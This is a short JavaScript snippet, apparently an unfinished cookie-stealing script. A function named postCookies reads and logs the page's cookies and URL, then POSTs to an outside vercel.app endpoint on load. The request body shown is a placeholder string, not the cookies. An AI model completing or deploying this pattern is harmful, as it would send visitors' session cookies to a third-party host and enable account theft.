function postCookies() {
  console.log(document.URL);
  console.log(document.cookie.split(";"));

  fetch("https://baconway.vercel.app/api/login.js", {
    method: "POST",
    body: JSON.stringify({ a: "dwqjidwqhiudqhui" }),
    mode: "cors",
  });
}

postCookies();
